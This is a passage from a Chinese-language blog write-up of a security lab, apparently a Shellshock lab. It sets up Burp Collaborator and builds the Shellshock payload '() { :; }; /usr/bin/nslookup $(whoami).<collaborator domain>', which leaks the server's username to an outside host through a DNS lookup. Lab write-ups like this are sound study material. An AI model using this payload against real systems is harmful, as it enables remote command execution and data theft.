<p>启动burp的collaborator<br><img src="/attachment/Pasted%20image%2020240611010543.png"><br><img src="/attachment/Pasted%20image%2020240611010617.png"><br>即可获得一个域名<br>所以刚才那条命令就是<code>nslookup $(whoami).x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com</code><br>改成绝对路径<code>/usr/bin/nslookup $(whoami).x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com</code></p>
<p>再改造成payload<code>() &#123; :; &#125;; /usr/bin/nslookup $(whoami).x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com</code><br>拼接到刚才构造的那里<br><img src="/attachment/Pasted%20image%2020240611010923.png"><br>然后Start attack<br>回到collaborator模块<br><img src="/attachment/Pasted%20image%2020240611011846.png"><br>看到这里有两个DNS记录(本来就是1,2两条, 但是由于我多按了一次, 所以图片是4条)</p>
<p><code>The Collaborator server received a DNS ookup of type A for the domain name peter-hZ11Xr.x97ikd34fj1pyvk8ka3q16b0lrrif83x.oastify.com.</code></p>
<p>可以得到用户名就是域名前面的<code>peter-hZ11Xr</code></p>

    </div>

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
    <div id="comment">
        <div id="gitalk-container">
        </div>
    </div>
    
</div>
                     
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © FHK新行星纪元637年 - 2024 FHK_KMD终晨
            <span class="footer-icon">
                <a-icon type="flag" theme="filled" /></span>
            @FHK_KMD6377
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
        
    </div>

</footer>

<script src="/js/highlight.min.js"></script>
<script src="/js/particle.js"></script>
                </div>
            </div>
        </transition>
    </div>

    <script>
    new Vue({
        el: "#layout",
        data: {
            show_page: false,
            onload_menu: false,
            menu_show: false,
            card_top: 100
        },
        created: function () {
            var that = this
            window.onload = function () {
                that.show_page = true
                document.getElementById("loadcontent").style.opacity = 0
                setTimeout(function () {
                    document.getElementById("loadleft").style.width = 0
                    document.getElementById("loadright").style.width = 0
                }, 300)
                setTimeout(function () {
                    document.getElementById("loading").style = "display:none"
                }, 600)
            }
        },
        mounted: function () {
            var that = this
            window.addEventListener('scroll', function (e) {
                that.menu_show = false
            })
        },
        methods: {
            home_click: function () {
                window.scrollTo({
                    top: window.innerHeight - 80,
                    behavior: "smooth",
                });
            }
        }
    })
</script>

<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script>
    const gitalk = new Gitalk({
        clientID: '',
        clientSecret: '',
        repo: 'hexo-theme-particle',      // The repository of store comments,
        owner: 'korilin',
        admin: ['korilin'],
        language: 'en',
        id: location.pathname,      // Ensure uniqueness and length less than 50
        distractionFreeMode: true  // Facebook-like distraction free mode
    })
    gitalk.render('gitalk-container')
</script>

</body>

</html>